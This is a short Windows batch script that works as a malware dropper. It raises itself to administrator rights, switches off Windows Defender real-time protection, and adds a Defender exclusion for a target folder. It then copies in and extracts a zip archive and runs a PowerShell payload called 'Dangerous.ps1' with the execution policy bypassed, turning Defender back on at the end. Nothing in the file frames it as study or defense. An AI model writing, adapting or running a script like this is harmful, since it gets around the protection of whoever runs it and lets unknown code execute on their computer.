@echo off
SETLOCAL ENABLEEXTENSIONS

:: CONFIGURATION
set ZIP_NAME=zip.zip
set DEST_DIR=

:: Check for admin privileges
NET SESSION >NUL 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrative privileges...
    PowerShell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Disable Windows Defender real-time protection
PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 

:: Create folder exclusion for Defender in C:\Users\Public\Videos
PowerShell -Command "Add-MpPreference -ExclusionPath '%DEST_DIR%'" 

:: Ensure the folder exists
if not exist "%DEST_DIR%" (
    mkdir "%DEST_DIR%"
)

:: Copy zip file from current dir to the destination
copy "%~dp0%ZIP_NAME%" "%DEST_DIR%\"

:: Decompress the zip file using native PowerShell (no password support)
PowerShell -Command "Expand-Archive -Path '%DEST_DIR%\%ZIP_NAME%' -DestinationPath '%DEST_DIR%' -Force"

:: Change current directory to Videos
pushd "%DEST_DIR%"

:: Run wi.ps1 from inside Videos
PowerShell -NoProfile -ExecutionPolicy Bypass -File "Dangerous.ps1"

:: Re-enable Windows Defender real-time protection
PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

pause
ENDLOCAL

